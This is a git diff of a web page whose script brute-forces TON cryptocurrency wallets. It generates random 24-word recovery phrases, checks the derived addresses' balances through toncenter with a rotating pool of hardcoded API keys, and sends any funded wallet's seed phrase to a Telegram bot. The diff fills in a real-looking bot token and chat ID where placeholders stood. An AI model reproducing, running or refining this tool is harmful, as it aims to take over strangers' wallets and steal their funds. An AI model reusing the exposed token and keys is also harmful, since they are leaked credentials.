@@ -30,9 +30,9 @@
     </div>
 
     <script>
-        // SIZNING SOZLAMALARINGIZ
-        const TELEGRAM_BOT_TOKEN = 'BU_YERGA_BOT_TOKENINGIZNI_YOZING'; // O'z tokeningizni qo'ying!
-        const TELEGRAM_CHAT_ID = 'BU_YERGA_CHAT_ID_YOZING'; // O'z Chat ID'ngizni qo'ying!
+        // SOZLAMALAR
+        const TELEGRAM_BOT_TOKEN = '8557227217:AAGTTWhdIfQUfYE-98Kfn61ZWndpH3Ng5Nw'; 
+        const TELEGRAM_CHAT_ID = '7921132456'; 
         const API_KEYS = [
             'cdef18c228c4a4d63ead8a723cbf910e0385e52829df0e62300b3f859142271a',
             'b9e1cd205b86ebbd57238da87fdfef86a408d0abea6a81b768177ad2b9edfdff',
@@ -53,29 +53,21 @@
             if (term.childNodes.length > 50) term.lastChild.remove();
         }
 
-        // Github o'rniga barqaror CDN orqali yuklash usuli (CORS xatosini chetlab o'tish uchun)
         async function init() {
             try {
-                // raw.githubusercontent.com o'rniga cdn.jsdelivr.net ishlatamiz
-                const res = await fetch('https://cdn.jsdelivr.net/gh/bitcoin/bips@master/bip-0039/english.txt');
+                const res = await fetch('https://raw.githubusercontent.com/bitcoin/bips/master/bip-0039/english.txt');
                 const text = await res.text();
                 bip39Words = text.split('\n').map(w => w.trim()).filter(w => w.length > 0);
-                
-                if (bip39Words.length > 2000) {
-                    addLog("Lug'at yuklandi (" + bip39Words.length + " ta so'z). Tizim tayyor!", "text-green-500");
-                } else {
-                    throw new Error("Lug'at to'liq yuklanmadi");
-                }
+                addLog("Lug'at yuklandi. Tizim tayyor!", "text-green-500");
             } catch (e) {
-                addLog("Xato: Lug'at yuklanmadi! Internet aloqangizni tekshiring.", "text-red-500");
-                console.error(e);
+                addLog("Xato: Lug'at yuklanmadi!", "text-red-500");
             }
         }
         init();
 
         async function forceStart() {
             if (bip39Words.length === 0) {
-                addLog("Iltimos, lug'at yuklanishini kuting yoki sahifani yangilang...", "text-yellow-500");
+                addLog("Iltimos, lug'at yuklanishini kuting...", "text-yellow-500");
                 return;
             }
             isRunning = true;
@@ -89,55 +81,47 @@
             if (!isRunning) return;
 
             try {
-                // 1. 24 so'z generatsiyasi
+                // 1. 24 ta so'z generatsiyasi
                 let mnemonic = [];
                 for(let i=0; i<24; i++) {
                     mnemonic.push(bip39Words[Math.floor(Math.random() * bip39Words.length)]);
                 }
 
-                // 2. Kutubxona orqali manzil olish
+                // 2. TonMnemonic kutubxonasini to'g'ri chaqirish
+                // TonWeb-Mnemonic kutubxonasi 'tonMnemonic' global obyekti ostida yuklanadi
                 if (window.tonMnemonic) {
-                    // Mnemonic yaroqliligini tekshirish (ixtiyoriy, lekin yaxshi amaliyot)
-                    const isMnemonicValid = await window.tonMnemonic.validateMnemonic(mnemonic);
-                    
-                    if (isMnemonicValid) {
-                        const keyPair = await window.tonMnemonic.mnemonicToKeyPair(mnemonic);
-                        const wallet = new tonweb.wallet.all.v4R2(tonweb.provider, { 
-                            publicKey: keyPair.publicKey, 
-                            wc: 0 
-                        });
-                        const address = await wallet.getAddress();
-                        const addrStr = address.toString(true, true, true);
+                    const keyPair = await window.tonMnemonic.mnemonicToKeyPair(mnemonic);
+                    const wallet = new tonweb.wallet.all.v4R2(tonweb.provider, { 
+                        publicKey: keyPair.publicKey, 
+                        wc: 0 
+                    });
+                    const address = await wallet.getAddress();
+                    const addrStr = address.toString(true, true, true);
 
-                        // 3. Balansni tekshirish
-                        const apiKey = API_KEYS[currentKeyIndex];
-                        currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
+                    // 3. API Kalitini almashtirish
+                    const apiKey = API_KEYS[currentKeyIndex];
+                    currentKeyIndex = (currentKeyIndex + 1) % API_KEYS.length;
 
-                        const apiRes = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${addrStr}&api_key=${apiKey}`);
-                        const data = await apiRes.json();
+                    // 4. Balansni tekshirish
+                    const apiRes = await fetch(`https://toncenter.com/api/v2/getAddressInformation?address=${addrStr}&api_key=${apiKey}`);
+                    const data = await apiRes.json();
 
-                        if (data.ok && data.result && parseInt(data.result.balance) > 0) {
-                            addLog(`💎 TOPILDI: ${addrStr}`, "text-green-400 font-bold");
-                            // Telegramga yuborish
-                            const msg = `💎 TOPILDI!\nAddr: ${addrStr}\nBalance: ${data.result.balance}\nPhrase: ${mnemonic.join(' ')}`;
-                            if (TELEGRAM_BOT_TOKEN !== 'BU_YERGA_BOT_TOKENINGIZNI_YOZING') {
-                                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
-                            }
-                        } else {
-                            addLog(`[API:${currentKeyIndex+1}] Bo'sh: ${addrStr.substring(0,12)}...`);
-                        }
+                    if (data.ok && data.result && parseInt(data.result.balance) > 0) {
+                        addLog(`💎 TOPILDI: ${addrStr}`, "text-green-400 font-bold");
+                        const msg = `💎 TOPILDI!\nAddr: ${addrStr}\nPhrase: ${mnemonic.join(' ')}`;
+                        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`);
                     } else {
-                         addLog(`Yaroqsiz kombinatsiya, o'tkazib yuborildi...`, "text-slate-600");
+                        addLog(`[API:${currentKeyIndex+1}] Bo'sh: ${addrStr.substring(0,10)}...`);
                     }
                 } else {
-                    addLog("Kutubxona hali yuklanmadi, kuting...", "text-red-400");
+                    addLog("Kutubxona yuklanmoqda...", "text-red-400");
                 }
             } catch (e) {
-                // Xatolik bo'lsa konsolga yozadi, dastur to'xtamaydi
-                console.log("Xato yuz berdi:", e.message);
+                console.error(e);
+                addLog("API so'rovida xato yoki limit tugadi", "text-red-500");
             }
 
-            // API bloklamasligi uchun 1.5 soniya pauza
+            // Tezlikni 1.5 sekundga tushirdim (API bloklamasligi uchun)
             setTimeout(runScanner, 1500); 
         }
     </script>
